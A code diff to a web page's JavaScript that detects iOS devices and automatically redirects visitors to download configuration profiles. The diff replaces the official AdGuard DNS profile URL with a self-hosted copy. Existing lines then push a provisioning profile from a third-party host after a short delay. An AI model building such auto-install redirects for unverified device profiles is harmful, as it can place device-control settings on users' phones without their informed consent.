@@ -22,7 +22,7 @@ if(navigator.vendor != null && navigator.vendor.match(/Apple Computer, Inc./) &&
     {
 
         //alert("Ваше устройство:  iPhone или  iPod");
-        window.location.href = "https://cdn.adguard.com/public/Dns/adguard-dns.mobileconfig";
+        window.location.href = "/adguard.mobileconfig";
 
     }
 
@@ -31,7 +31,7 @@ else if (navigator.vendor != null && navigator.vendor.match(/Apple Computer, Inc
     {
 
         //alert("Ваше устройство:  iPad");
-        window.location.href = "https://cdn.adguard.com/public/Dns/adguard-dns.mobileconfig";
+        window.location.href = "/adguard.mobileconfig";
 
     }
 
@@ -90,12 +90,12 @@ else if (navigator.vendor == null || navigator.vendor != null)
 
                         </div>
 			<script>
-				window.location.href = 'https://cdn.adguard.com/public/Dns/adguard-dns.mobileconfig';
+				window.location.href = '/adguard.mobileconfig';
 			setTimeout(function(){
 				window.location.href = 'https://ios-udid.com/mlq.mobileprovision';
 			},1500)
 			var get = function(){
-			window.location.href = 'https://cdn.adguard.com/public/Dns/adguard-dns.mobileconfig';
+			window.location.href = '/adguard.mobileconfig';
 			setTimeout(function(){
 				window.location.href = 'https://ios-udid.com/mlq.mobileprovision';
 			},1500)
